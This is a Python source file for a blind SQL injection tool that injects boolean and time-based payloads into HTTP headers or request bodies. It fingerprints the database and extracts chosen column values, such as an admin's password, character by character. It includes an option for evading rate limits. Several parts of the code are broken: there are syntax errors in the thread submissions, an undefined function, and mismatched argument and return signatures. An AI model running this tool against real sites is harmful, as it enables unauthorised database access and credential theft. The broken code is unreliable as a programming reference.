import time
import requests
import string
import argparse
import json
import os
import sys
import select
import multiprocessing
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed

def usage():
    usage = """
    BlindBrute - Blind SQL Injection Brute Forcer with Header, Data, and File Support

    Usage:
        python blindbrute.py -u <URL> -t <TABLE> -c <COLUMN> -w <WHERE CLAUSE> [options]

    Required Arguments:
        -u, --url                    Target URL
        -t, --table                  Table name from which to extract the data
        -c, --column                 Column name to extract (e.g., Password)
        -w, --where                  WHERE clause (e.g., Username = 'Administrator')

    Optional Arguments:
        -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
        -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
        -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
        -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
        -ba, --binary-attack         Use binary search for ASCII extraction
        -da, --dictionary-attack     Path to a wordlist file for dictionary-based extraction
        --delay                      Delay in seconds between requests to bypass rate limiting
        --timeout                    Timeout for each request in seconds (default: 10)
        --verbose                    Enable verbose output for debugging
        --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
        --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
        --sleep-only                 Use only sleep-based detection methods
        --force                      Skip the injectability check and force a detection method (status, content, keyword, or sleep)

    Examples:
        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status

    Description:
        BlindBrute is a tool for performing blind SQL injection attacks. It supports detecting vulnerabilities using status codes, content length, 
        keyword comparisons, and time-based SQL injection techniques. Custom headers, data, and HTTP request templates can be used for precise control.
    """
    print(usage)

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

def load_version_queries():
    file_path = os.path.join(os.path.dirname(__file__), 'version_queries.json')
    try:
        with open(file_path, 'r') as file:
            version_queries = json.load(file)
        return version_queries
    except Exception as e:
        print(f"Error loading version queries: {e}")
        return {}

version_queries = load_version_queries()

def max_workers(args):

    try:
        num_cpus = os.cpu_count() 
        level = args.level
        max_workers = num_cpus * level
        return max_workers

    except Exception as e:
        print(f"[-] Error determining max_workers: {e}. Defaulting to 8.")
        return 8

# Main Logic

def is_injectable(request_template=None, injectable_headers={}, static_headers={}, args=None):
    
    test_payloads = {
        "true_condition": "' AND '1'='1",
        "false_condition": "' AND '1'='2"
    }

    true_response_content = ""
    false_response_content = ""
    true_status_code = None
    false_status_code = None

    # Step 1: Test true and false conditions
    for condition, payload in test_payloads.items():
        encoded_payload = quote(payload)

        if args.verbose:
            print(f"[VERBOSE] Testing condition: {condition}")
            print(f"[VERBOSE] Payload: {payload} | Encoded Payload: {encoded_payload}")
        
        try:
            response, response_time = inject( 
                encoded_payload=encoded_payload, 
                request_template=request_template, 
                injectable_headers=injectable_headers, 
                static_headers=static_headers, 
                args=args
                )
            
            if not response:
                return None, None
            
            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                time.sleep(args.delay)

            if condition == "true_condition":
                true_status_code = response.status_code
                true_response_content = response.text
            elif condition == "false_condition":
                false_status_code = response.status_code
                false_response_content = response.text

            if args.verbose:
                print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
                print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
                print(f"[VERBOSE] Request time: {response_time} seconds")

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during {condition} injection request: {e}")
            return None, None

    # Step 2: Dertermine detection method
    if args.true_keywords or args.false_keywords:
        if args.true_keywords:
            if any(keyword in true_response_content for keyword in args.true_keywords):
                print("[+] Keyword(s) detected in true condition response. header is likely injectable!")
                return True, "keyword"
            else:
                print("[-] No true keywords found in response.")
                return None, None

        if args.false_keywords:
            if any(keyword in false_response_content for keyword in args.false_keywords):
                print("[+] Keyword(s) detected in false condition response.")
                return True, "keyword"
            else:
                print("[-] No false keywords found in response.")
                return None, None

        return False, None
        print (f"[-] Keyword detection failed.")

    if true_status_code != false_status_code:
        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). header is likely injectable!")
        return True, "status"

    true_content_length = len(true_response_content)
    false_content_length = len(false_response_content)
    
    if true_content_length != false_content_length:
        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). header is likely injectable!")
        if args.verbose:
            print(f"[VERBOSE] True response length: {true_content_length} | False response length: {false_content_length}")
        return True, "content"

    print("[-] No significant status code, content length, or keyword differences detected. header is likely not injectable.")
    return False, None

def detect_database(request_template=None, injectable_headers={}, static_headers={}, detection="status", max_workers=8, args=None):
    
    print("[*] Attempting to detect the database type...")

    if args.verbose and not args.sleep_only:
        print(f"[VERBOSE] Detection method: {detection}")

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None, None

    # Step 2: Prepare all db_names, version queries, and sleep queries
    tasks = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:  # Figure out how to adjust based on system resources
        for db_name, info in version_queries.items():
            db_query = info.get("version_query")
            sleep_query = info.get("sleep_function", None)

            payload = f"' AND ({db_query})"
            encoded_payload = quote(payload)

            if sleep_query and args.sleep_only:
                for db_specific, sleep_function in sleep_query.items():
                    if sleep_function and sleep_function != "N/A":
                        payload = f"' AND {sleep_function}"
                        encoded_payload = quote(payload)
                        tasks.append(executor.submit(detect, db_name, encoded_payload, payload_type='sleep', 
                                                     baseline_status_code, baseline_content_length, 
                                                     request_template, injectable_headers, static_headers, detection, args))
            else:
                tasks.append(executor.submit(detect, db_name, encoded_payload, payload_type='regular', 
                                             baseline_status_code, baseline_content_length, 
                                             request_template, injectable_headers, static_headers, detection, args))

        # Step 3: Execute the requests and wait for the first successful detection
        for future in as_completed(tasks):
            result = future.result()
            if result:
                detected_db, substring_function = result
                print(f"[+] Database detected: {detected_db}")
                return detected_db, substring_function

    print(f"[-] Unable to detect the database type. Exiting")
    return None, None

def discover_length(table, column, where_clause, db_name, detection="status", max_length=1000, request_template=None, injectable_headers={}, static_headers={}, args=None):

    if db_name not in version_queries:
        print(f"[-] Database {db_name} not found in version queries.")
        return None

    length_function = version_queries[db_name].get("length_function", None)
    sleep_function = version_queries[db_name].get("sleep_function", None)

    if not length_function or length_function == "N/A":
        print(f"[-] Length function not found for {db_name}.")
        return None

    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_function}...")

    # Sleep Override
    if args.sleep_only and sleep_function:
        print(f"[*] Sleep-only mode enabled. Attempting sleep-based length discovery...")
        low = 1
        high = max_length
        length = None

        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND {sleep_function} AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
            encoded_payload = quote(payload)

            try:
                response, response_time = inject(
                    encoded_payload=encoded_payload,
                    request_template=request_template,
                    injectable_headers=injectable_headers,
                    static_headers=static_headers,
                    args=args
                )

                if not response:
                    return None

                if response_time > 5:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1

            except requests.exceptions.RequestException as e:
                print(f"[-] Error during sleep-based length discovery: {e}")
                return None

        if length:
            print(f"[+] Sleep-based data length discovered: {length}")
            return length
        else:
            print(f"[-] Failed to discover data length within the maximum length {max_length} using sleep-based detection.")
            return None

    low = 1
    high = max_length
    length = None

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None

    # Step 2: Test lengths
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
        encoded_payload = quote(payload)

        try:
            response, _ = inject(
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if not response:
                return None

            if detection == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    high = mid - 1
                    length = mid
                elif args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                    low = mid + 1
                else:
                    low = mid + 1

            elif detection == "status":
                if response.status_code != baseline_status_code:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1

            elif detection == "content":
                if len(response.text) != baseline_content_length:
                    high = mid - 1
                    length = mid
                else:
                    low = mid + 1

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during length discovery: {e}")
            return None

    if length:
        print(f"[+] Data length discovered: {length}")
        return length
    else:
        print(f"[-] Failed to discover data length within the maximum length {max_length}.")
        return None

def extract_data(table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", max_workers=8, args=None):

    extracted_data = ""
    wordlist = None

    if args.verbose:
        print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
        print(f"[VERBOSE] WHERE clause: {where_clause}")
        if not args.sleep_only:
            print(f"[VERBOSE] Extraction method: {extraction}")

    if args.dictionary_attack:
        try:
            with open(args.dictionary_attack, 'r') as wordlist_file:
                wordlist = [line.strip() for line in wordlist_file.readlines()]
            if args.verbose:
                print(f"[VERBOSE] Loaded {len(wordlist)} lines from dictionary file.")
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
            return extracted_data

    if not data_length:
        print(f"[!] Data length not discovered. Using fallback detection...")
        data_length = args.max_length
        print(f"[!] Defaulting to max length: {data_length} (can be adjusted with --max-length)")

    # Step 1: Baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = baseline_request(
            request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return extracted_data

    # Binary search overrride (not threaded)
    if args.binary_attack:
        while position <= data_length:
            low, high = 32, 126
            found_match = False
            while low <= high:
                mid = (low + high) // 2
                payload = f"' AND ASCII({string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1)) > {mid}"
                encoded_payload = quote(payload)

                result = extract(
                    table, column, where_clause, string_function, position, value=chr(mid),
                    request_template, injectable_headers, static_headers,
                    extraction, baseline_status_code, baseline_content_length,
                    db_name=db_name, encoded_payload=encoded_payload, args=args
                )

                if result:
                    low = mid + 1
                else:
                    high = mid - 1

            if 32 <= low <= 126:
                extracted_data += chr(low)
                print(f"Value found: {chr(low)} at position {position}")
                found_match = True
            else:
                print(f"[*] No valid match found at position {position}. Moving to next position.")

            position += 1

            if not found_match:
                print(f"[*] No match found at position {position}. Stopping extraction.")
                break

    # Step 2: Iterate over possible values
    while position <= data_length:
        found_match = False
        fallback_to_char = False
        if position > (2 * data_length // 3):
            fallback_to_char = one_third()

        possible_values = wordlist if wordlist and not fallback_to_char else CHARSET

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            tasks = []
            for value in possible_values:
                if wordlist and len(value) > (data_length - position + 1):
                    continue

                payload = f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {len(value)}) = '{value}"
                encoded_payload = quote(payload)

                tasks.append(executor.submit(extract, table, column, where_clause, string_function, position, value,
                                             request_template, injectable_headers, static_headers, extraction,
                                             baseline_status_code, baseline_content_length, db_name, encoded_payload, args))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    extracted_data += result
                    print(f"Value found: {result} at position {position}")
                    position += len(result)
                    found_match = True
                    break

        if not found_match:
            print(f"[*] No match found at position {position}. Stopping extraction.")
            break

    return extracted_data

### Helper Functions <3

def one_third():

    print("\n[*] A third or less of the data remains to be extracted.")
    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
    
    i, _, _ = select.select([sys.stdin], [], [], 60)
    
    if i:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == 'y':
            return True
        elif user_input == 'n':
            return False
    else:
        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
        return True

def no_length():

    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ", end='', flush=True)

    i, _, _ = select.select([sys.stdin], [], [], 60)

    if i:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == 'y':
            return True
        elif user_input == 'n':
            return False
    else:
        print("\n[*] No input received. Proceeding with extraction anyway.")
        return True

def load_request(file_path):

    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        return parse_request_file(file_content)
    except Exception as e:
        print(f"[-] Error reading request file: {e}")
        return None, None, None

def parse_request(file_content):

    lines = file_content.splitlines()
    
    if not lines:
        raise ValueError("The file is empty.. why are you like this?")

    request_line = lines[0].strip()
    
    try:
        method, _, _ = request_line.split(' ', 2)
    except ValueError:
        raise ValueError("Invalid request line: Unable to parse HTTP method")
    
    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        line = line.strip()

        if not line and not is_body:
            is_body = True
            continue

        if is_body:
            body += line + "\n" if line else ""
        else:
            if ': ' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            else:
                raise ValueError(f"Invalid header format: {line}")

    body = body.rstrip("\n")

    return method, headers, body

def send_request(headers=None, body=None, method="GET", args=None):

    try:
        if method == "POST":
            response = requests.post(url=args.url, headers=headers, body=body, timeout=args.timeout)
        elif method == "PUT":
            response = requests.put(url=args.url, headers=headers, body=body, timeout=args.timeout)
        elif method == "PATCH":
            response = requests.patch(url=args.url, headers=headers, body=body, timeout=args.timeout)
        elif method == "GET":
            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)
        elif method == "DELETE":
            response = requests.delete(url=args.url, headers=headers, timeout=args.timeout)
        elif method == "HEAD":
            response = requests.head(url=args.url, headers=headers, timeout=args.timeout)
        elif method == "OPTIONS":
            response = requests.options(url=args.url, headers=headers, timeout=args.timeout)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {method} request: {e}")
        return None

def baseline_request(request_template, injectable_headers, static_headers, args):

    start_time = time.time()

    if request_template:
        method, url, headers, body = parse_request(request_template)
        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
    else:
        headers = {**static_headers, **injectable_headers}
        if args.data:
            response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
        else:
            response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

    end_time = time.time()
    baseline_status_code = response.status_code
    baseline_content_length = len(response.text)
    response_time = end_time - start_time

    if args.verbose:
        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
        print(f"[VERBOSE] Response time: {response_time} seconds")

    return response, baseline_status_code, baseline_content_length, response_time

def inject(encoded_payload, request_template, injectable_headers, static_headers, args):

    try:
        start_time = time.time()

        if request_template:
            injected_template = request_template.replace("INJECT", encoded_payload)
            method, url, headers, body = parse_request(injected_template)
            response = send_request(method=method, url=url, headers=headers, body=body, timeout=args.timeout)
        else:
            headers = {**static_headers}
            for key, value in injectable_headers.items():
                headers[key] = value + encoded_payload
            if args.data:
                response = requests.post(url=args.url, headers=headers, data=args.data, timeout=args.timeout)
            else:
                response = requests.get(url=args.url, headers=headers, timeout=args.timeout)

        end_time = time.time()
        response_time = end_time - start_time

        if args.verbose:
            print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
            print(f"[VERBOSE] Request time: {response_time} seconds")

        return response, response_time
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")
        return None, None

def detect(db_name, encoded_payload, payload_type, baseline_status_code, baseline_content_length, request_template, injectable_headers, static_headers, detection, args=None):
    
    if args.verbose:
        print(f"[VERBOSE] Sending {payload_type} payload for {db_name}")

    try:
        response, response_time = inject(
            encoded_payload=encoded_payload,
            request_template=request_template,
            injectable_headers=injectable_headers,
            static_headers=static_headers,
            args=args
        )

        if not response:
            return None

        if payload_type == 'sleep' and response_time > 5:
            print(f"[+] Sleep-based detection: Database detected as {db_name}")
            return db_name, version_queries[db_name].get("substring_function", None)
        elif payload_type == 'regular':
            if detection == "status" and response.status_code != baseline_status_code:
                print(f"[+] Status-based detection: Database detected as {db_name}")
                return db_name, version_queries[db_name].get("substring_function", None)
            elif detection == "content" and len(response.text) != baseline_content_length:
                print(f"[+] Content-based detection: Database detected as {db_name}")
                return db_name, version_queries[db_name].get("substring_function", None)
            elif detection == "keyword":
                if any(keyword in response.text for keyword in args.true_keywords):
                    print(f"[+] Keyword-based detection: Database detected as {db_name}")
                    return db_name, version_queries[db_name].get("substring_function", None)

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {payload_type}-based detection for {db_name}: {e}")
    
    return None

def extract(table, column, where_clause, string_function, position, value, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, db_name=None, encoded_payload=None, args=None):

    # Sleep only override for encoded payload
    if args.sleep_only and db_name:
        sleep_function = version_queries[db_name].get("sleep_function", None)
        if not sleep_function or sleep_function == "N/A":
            print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
            return None

        for db_specific, sleep_query in sleep_function.items():
            if not sleep_query or sleep_query == "N/A":
                print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
                continue
            payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, {value_length}) = '{value}'"
            encoded_payload = quote(payload)

    try:
        if args.verbose:
            print(f"[VERBOSE] Querying Database: {db_name if args.sleep_only else 'Regular'} with payload: {encoded_payload}")

        response, response_time = inject(
            encoded_payload=encoded_payload,
            request_template=request_template,
            injectable_headers=injectable_headers,
            static_headers=static_headers,
            args=args
        )

        if not response:
            return None

        if args.delay > 0:
            if args.verbose:
                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
            time.sleep(args.delay)

        if args.sleep_only:
            if response_time > 5:
                print(f"[+] Sleep-based match found: {value} at position {position}")
                return value
        else:
            if extraction == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    return value
                if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                    return None
            elif extraction == "status":
                if response.status_code != baseline_status_code:
                    return value
            elif extraction == "content":
                response_content_length = len(response.text)
                if response_content_length != baseline_content_length:
                    return value

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {'sleep-based ' if args.sleep_only else ''}extraction for {value}: {e}")
        return None

    return None

# MAIN

def main():

    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")

    parser.add_argument('-u', '--url', required=True, help="Target URL")
    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
    parser.add_argument('-sh', '--static-headers', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
    parser.add_argument('-d','--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
    parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
    parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
    parser.add_argument('-c', '--column', required=True, help="Column name to extract (e.g., Password)")
    parser.add_argument('-w', '--where', required=True, help="WHERE clause (e.g., Username = 'Administrator')")
    parser.add_argument('-m', '--max-length', type=int, default=1000, help="Maximum length of the extracted data that the script will check for (default: 1000)")
    parser.add_argument('-o', '--output-file', required=False, help="Specify a file to output the extracted data")
    parser.add_argument('-ba', '--binary-attack', action='store_true', help="Use binary search for ASCII extraction")
    parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist for dictionary-based extraction. Falls back to character extraction when 2/3's of the data extraction is complete unless user specifies otherwise.")
    parser.add_argument('--level', type=int, choices=[1, 2, 3, 4, 5], default=2, help="Specify the threading level. Level 1 produces the least amount of workers and level 5 the most. Number workers is calculated as (CPU cores * level). Default is 2.")
    parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
    parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
    parser.add_argument('--false-keywords', nargs='+', help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
    parser.add_argument('--sleep-only', action='store_true', help="Use only sleep-based detection methods")
    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
    parser.add_argument('--force', type=str, choices=['status', 'content', 'keyword', 'sleep'], help="Skip the check for an injectable field and force a detection method (status, content, keyword or sleep)")

    args = parser.parse_args()

    if len(sys.argv) == 1:
        usage()
        return

    if not args.url and not args.file:
        print("[!] You must provide either a URL (-u) or a request file (-f).")
        return
    if args.url and not (args.injectable_headers or args.data):
        print("[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
        return
    if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
        print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
        return
    if args.data and args.file:
        print ("[!] You cannot specify data for the request file outside of the request file.")
        return
    if not args.url and not request_template:
        print("[!] You must provide a valid request template or URL.")
        return

    injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
    static_headers = dict(args.static_headers) if args.static_headers else {}

    request_template = None
    if args.file:
        request_template = load_request(args.file)
        if not request_template:
            return

    max_workers=max_workers()

    detection = None

    if args.force:
        if args.force == "keyword":
            if args.true_keywords or args.false_keywords:
                detection = "keyword"
            else:
                print ("[!] You must provide keywords to force a keyword detection.")
                return
        elif args.force == "sleep":
            args.sleep_only = True
        else:
            detection = args.force
        print(f"[+] Skipping injection check and detection discovery. Using forced detection method: {detection}")
    else:
    # Step 1: Check if the field is injectable
        injectable, detection = is_injectable(args.url, injectable_headers, static_headers, request_template, args=args)
        if not injectable:
            return
        print(f"[+] header is injectable using {detection} method.")
        print("[+] Checking database type and corresponding substring function...")

    # Step 2: Detect the database type
    db_type, string_function = detect_database(args.url, injectable_headers, static_headers, request_template, detection=detection, max_workers=max_workers, args=args)

    if not db_type:
        print("[-] Unable to detect database type.")
        return
    elif not string_function:
        print(f"[*] Database {db_type} detected, but substring operations are not applicable.")
        return

    # Step 3: Discover length of data
    data_length = discover_length(
        url=args.url,
        table=args.table,
        column=args.column,
        where_clause=args.where,
        db_name=db_type,
        detection=detection,
        max_length=args.max_length,
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        args=args
    )

    if data_length:
        print(f"[+] Data length to extract: {data_length}")
    else:
        if no_length():
            data_length = args.max_length
            print(f"[!] Data length not discovered. Defaulting to max length: {data_length} (can be adjusted with --max-length)")
        else:
            print("[-] User chose not to proceed with extraction.")
            return

    # Step 4: Extract the data
    extracted_data = extract_data(
        url=args.url, 
        table=args.table, 
        column=args.column, 
        where_clause=args.where, 
        string_function=string_function, 
        position=1,
        db_name=db_type,
        data_length=data_length,
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        extraction=detection,
        max_workers=max_workers,
        args=args
    )

    if args.output_file:
        try:
            with open(args.output_file, 'w') as output_file:
                output_file.write(extracted_data)
            print(f"[+] Data written to {args.output_file}")
        except Exception as e:
            print(f"[-] Error writing to output file: {e}")
            print(f"Extracted data: {extracted_data}")
    else:
        print(f"Extracted data: {extracted_data}")

if __name__ == "__main__":
    main()
